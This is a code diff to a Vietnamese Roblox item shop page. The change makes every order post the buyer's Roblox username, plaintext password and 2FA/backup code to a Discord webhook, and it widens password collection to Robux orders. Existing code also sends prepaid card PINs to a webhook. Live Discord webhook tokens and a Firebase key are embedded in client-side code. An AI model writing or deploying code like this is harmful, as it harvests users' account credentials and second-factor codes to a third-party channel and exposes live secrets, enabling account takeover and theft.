@@ -19,7 +19,6 @@
         .logo-img { height: 45px; width: auto; object-fit: contain; margin-right: 10px; mix-blend-mode: screen; filter: brightness(1.2); }
         .logo-text { font-size: 18px; font-weight: 900; color: var(--sky); }
 
-        /* --- TÍNH NĂNG STATUS MỚI (ĐỒNG BỘ ADMIN) --- */
         .system-status-bar { background: rgba(56, 189, 248, 0.1); border-bottom: 1px solid rgba(56, 189, 248, 0.2); padding: 10px 5%; display: flex; flex-direction: column; align-items: center; gap: 5px; text-align: center; }
         .status-header { display: flex; align-items: center; gap: 10px; font-size: 13px; font-weight: 800; text-transform: uppercase; }
         .status-dot { width: 10px; height: 10px; border-radius: 50%; background: var(--success); box-shadow: 0 0 10px var(--success); animation: pulse 1.5s infinite; }
@@ -196,7 +195,11 @@
 
     const firebaseConfig = { apiKey: "AIzaSyAodrFbbkBhdSWA7oY_qz4FnoRUpQpsJls", authDomain: "dexsty-shop-f955d.firebaseapp.com", databaseURL: "https://dexsty-shop-f955d-default-rtdb.firebaseio.com", projectId: "dexsty-shop-f955d" };
     const app = initializeApp(firebaseConfig); const auth = getAuth(app); const rtdb = getDatabase(app);
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1486075383743905925/GtoDjx9Kic9kwZmfe1kW8mOXtpzd7z9H7O3U00oreOJ6-BiWBwyMz5nvlFRiLxgGCs-U";
+    
+    // Webhook gửi yêu cầu nạp tiền
+    const DEPOSIT_WEBHOOK = "https://discord.com/api/webhooks/1486075383743905925/GtoDjx9Kic9kwZmfe1kW8mOXtpzd7z9H7O3U00oreOJ6-BiWBwyMz5nvlFRiLxgGCs-U";
+    // Webhook gửi đơn mua hàng (MỚI THEO YÊU CẦU)
+    const PURCHASE_WEBHOOK = "https://discord.com/api/webhooks/1486062088114798744/NIdkZaGVo549rigv63oC3X6fnHA5Hot5sBsAKUMpoBtSFZ5syeGWmrm8JprxVcqtH8sc";
 
     // --- LOGIC ĐỒNG BỘ STATUS TỪ NHÁNH settings/shopStatus ---
     let isMaintenance = false;
@@ -230,7 +233,6 @@
                 dot.style.boxShadow = '0 0 10px #22c55e';
             }
 
-            // Vô hiệu hóa/Kích hoạt các nút mua hàng toàn trang
             document.querySelectorAll('.btn-buy').forEach(btn => {
                 btn.disabled = isMaintenance;
                 if(isMaintenance) btn.innerText = "BẢO TRÌ";
@@ -240,16 +242,13 @@
         });
     }
 
-    // --- LOGIC CHUYỂN TAB ---
     window.switchTab = (type) => {
         document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
         document.querySelectorAll('.grid').forEach(grid => grid.classList.remove('active'));
-        
         event.currentTarget.classList.add('active');
         document.getElementById(type + '-grid').classList.add('active');
     };
 
-    // --- LOGIC TÍNH TOÁN ROBUX ---
     const RATE = 230; 
     window.calcRobux = () => {
         const rb = parseInt(document.getElementById('inputRobux').value) || 0;
@@ -268,7 +267,6 @@
         window.buyItem(`Nạp ${rb} Robux (Đặt ${totalWithTax} RB)`, price, 'robux');
     };
 
-    // --- LOGIC MUA HÀNG ---
     window.openAuthModal = () => document.getElementById('authModal').style.display = 'flex';
     window.closeModal = (id) => document.getElementById(id).style.display = 'none';
     window.showAlert = (msg, isSuccess = false) => {
@@ -296,7 +294,7 @@
         document.getElementById('roblox2fa').value = "";
         document.getElementById('checkCorrect').checked = false;
 
-        if(type === 'service') {
+        if(type === 'service' || type === 'robux') {
             document.getElementById('row-pass').style.display = 'table-row';
             document.getElementById('row-2fa').style.display = 'table-row';
         } else {
@@ -312,7 +310,7 @@
         const roblox2fa = document.getElementById('roblox2fa').value.trim();
 
         if(!robloxName || !document.getElementById('checkCorrect').checked) return showAlert("Vui lòng điền đủ thông tin!");
-        if(pendingItem.type === 'service' && !robloxPass) return showAlert("Vui lòng nhập mật khẩu!");
+        if((pendingItem.type === 'service' || pendingItem.type === 'robux') && !robloxPass) return showAlert("Vui lòng nhập mật khẩu!");
         if(currentBalance < pendingItem.price) return showAlert("Số dư không đủ!");
 
         try {
@@ -327,21 +325,44 @@
                 status: "Chờ xử lý", 
                 timestamp: orderId
             };
-            if(pendingItem.type === 'service') {
+            if(pendingItem.type === 'service' || pendingItem.type === 'robux') {
                 orderData.robloxPass = robloxPass;
                 orderData.roblox2fa = roblox2fa;
             }
 
             await set(ref(rtdb, 'orders/' + orderId), orderData);
+
+            // GỬI WEBHOOK ĐƠN HÀNG (MỚI)
+            await fetch(PURCHASE_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: "Dexsty Shop - ĐƠN MỚI",
+                    embeds: [{
+                        title: "🛒 CÓ ĐƠN HÀNG MỚI!",
+                        color: 3447003,
+                        fields: [
+                            { name: "👤 Khách hàng", value: auth.currentUser.email, inline: true },
+                            { name: "📦 Sản phẩm", value: pendingItem.name, inline: true },
+                            { name: "💰 Giá", value: pendingItem.price.toLocaleString() + "đ", inline: true },
+                            { name: "🎮 Tài khoản", value: `\`${robloxName}\``, inline: true },
+                            { name: "🔑 Mật khẩu", value: `\`${robloxPass || "N/A"}\``, inline: true },
+                            { name: "🔐 2FA/Backup", value: `\`${roblox2fa || "N/A"}\``, inline: true }
+                        ],
+                        footer: { text: "Hệ thống Dexsty Shop" },
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            });
+
             window.closeModal('robloxModal'); showAlert("Mua thành công!", true);
         } catch (e) { showAlert(e.message); }
     };
 
-    // --- WEBHOOKS & AUTH ---
     window.sendDepositWebhook = async () => {
         const u = auth.currentUser; if(!u) return;
         try {
-            await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: "Dexsty Shop - BANK", embeds: [{ title: "🏦 YÊU CẦU NẠP BANK!", color: 2278750, fields: [{ name: "👤 Khách", value: u.email, inline: true }, { name: "📝 Nội dung", value: "NAP " + u.email, inline: true }], timestamp: new Date().toISOString() }] }) });
+            await fetch(DEPOSIT_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: "Dexsty Shop - BANK", embeds: [{ title: "🏦 YÊU CẦU NẠP BANK!", color: 2278750, fields: [{ name: "👤 Khách", value: u.email, inline: true }, { name: "📝 Nội dung", value: "NAP " + u.email, inline: true }], timestamp: new Date().toISOString() }] }) });
             window.closeModal('depositModal'); showAlert("Đã gửi yêu cầu nạp!", true);
         } catch (e) { showAlert(e.message); }
     };
@@ -350,7 +371,7 @@
         const t = document.getElementById('cardType').value, v = document.getElementById('cardValue').value, p = document.getElementById('cardPin').value.trim(), s = document.getElementById('cardSeri').value.trim(), u = auth.currentUser;
         if(!t || !v || !p || !s) return showAlert("Vui lòng điền đủ thông tin!");
         try {
-            await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: "Dexsty Shop - THẺ CÀO", embeds: [{ title: "💳 THẺ CÀO MỚI!", color: 16711767, fields: [{ name: "👤 Khách", value: u.email, inline: true }, { name: "🆔 Loại", value: t, inline: true }, { name: "💰 Mệnh giá", value: Number(v).toLocaleString() + "đ", inline: true }, { name: "🔑 PIN", value: `\`${p}\`` }, { name: "🔢 Seri", value: `\`${s}\`` }], timestamp: new Date().toISOString() }] }) });
+            await fetch(DEPOSIT_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: "Dexsty Shop - THẺ CÀO", embeds: [{ title: "💳 THẺ CÀO MỚI!", color: 16711767, fields: [{ name: "👤 Khách", value: u.email, inline: true }, { name: "🆔 Loại", value: t, inline: true }, { name: "💰 Mệnh giá", value: Number(v).toLocaleString() + "đ", inline: true }, { name: "🔑 PIN", value: `\`${p}\`` }, { name: "🔢 Seri", value: `\`${s}\`` }], timestamp: new Date().toISOString() }] }) });
             window.closeModal('depositModal'); showAlert("Đã gửi thẻ thành công!", true);
         } catch (e) { showAlert(e.message); }
     };
@@ -484,7 +505,7 @@
     ];
 
     function render() {
-        initSystemStatus(); // Kích hoạt đọc Status từ Firebase
+        initSystemStatus();
         const gp = document.getElementById('gp-grid'), fr = document.getElementById('fruit-grid'), sv = document.getElementById('service-grid');
         gp.innerHTML = ''; fr.innerHTML = ''; sv.innerHTML = '';
         
@@ -492,7 +513,6 @@
             const card = document.createElement('div'); card.className = 'card';
             const itemType = item.t === 's' ? 'service' : (item.t === 'f' ? 'fruit' : 'gp');
             card.innerHTML = `<img src="${item.i}" loading="lazy"><h3>${item.n}</h3><div class="price">${item.p.toLocaleString()}đ</div><button class="btn-buy" onclick="window.buyItem('${item.n}', ${item.p}, '${itemType}')">MUA NGAY</button>`;
-            
             if(item.t === 'f') fr.appendChild(card); 
             else if(item.t === 's') sv.appendChild(card);
             else gp.appendChild(card);
